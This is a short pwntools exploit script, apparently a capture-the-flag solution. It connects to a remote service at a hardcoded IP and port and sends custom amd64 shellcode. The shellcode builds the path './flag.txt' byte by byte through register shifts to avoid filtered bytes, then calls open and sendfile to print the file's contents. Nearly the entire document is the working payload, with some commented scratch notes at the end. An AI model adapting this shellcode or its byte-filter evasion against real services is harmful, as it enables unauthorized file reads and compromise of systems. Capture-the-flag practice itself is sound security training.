from pwn import *
p = remote("152.69.210.130", 3002)
#p = process('./challenge')
#gdb.attach(p, "b*main+236")
#p = remote("localhost", 3002) 
context.arch = 'amd64' 
payload = asm(
"""
// Add flag.txt to r11

xor r11, r11

add r11, 0x73
inc r11
.rept 8
shl r11
.endr

add r11, 0x77
inc r11


push r11


xor r11, r11

add r11, 0x73
inc r11
.rept 8
shl r11
.endr

add r11, 0x2d
inc r11
.rept 8
shl r11
.endr

add r11, 0x67
.rept 8
shl r11
.endr

add r11, 0x61
.rept 8
shl r11
.endr

add r11, 0x6b
inc r11
.rept 8
shl r11
.endr

add r11, 0x65
inc r11
.rept 8
shl r11
.endr

add r11, 0x2f
.rept 8
shl r11
.endr

add r11, 0x2d
inc r11
//push "flag.txt" to stack and set rdi to rsp

push r11

xor r11, r11
add r11, rsp
xchg r11, rdi

// XOR rsi and rdx

xor r11, r11
xchg r11, rsi
xor r11, r11
xchg r11, rdx

// set rax to open syscall num

xor r11, r11
inc r11
inc r11
xchg r11, rax
syscall

// set rdi to 1 (stdout)

xor r11, r11
inc r11
xchg r11, rdi

// set rsi to 1

xor r11, r11
inc r11
inc r11
inc r11
xchg r11, rsi

// set rdx to 0

xor r11, r11
xchg r11, rdx

// set r10 to 0x100

xor r11, r11
add r11, 0x61
xchg r11, r10


// Syscall for sendfile
xor r11, r11
add r11, 0x27
inc r11
xchg r11, rax
syscall

""")
p.sendline(payload)

p.interactive()


# 7478
# 742e67616c662f2e
# .rept 8
# shl r11
# .endr

# add r11, 0x2f
# .rept 8
# shl r11
# .endr

# add r11, 0x2d
# inc r11


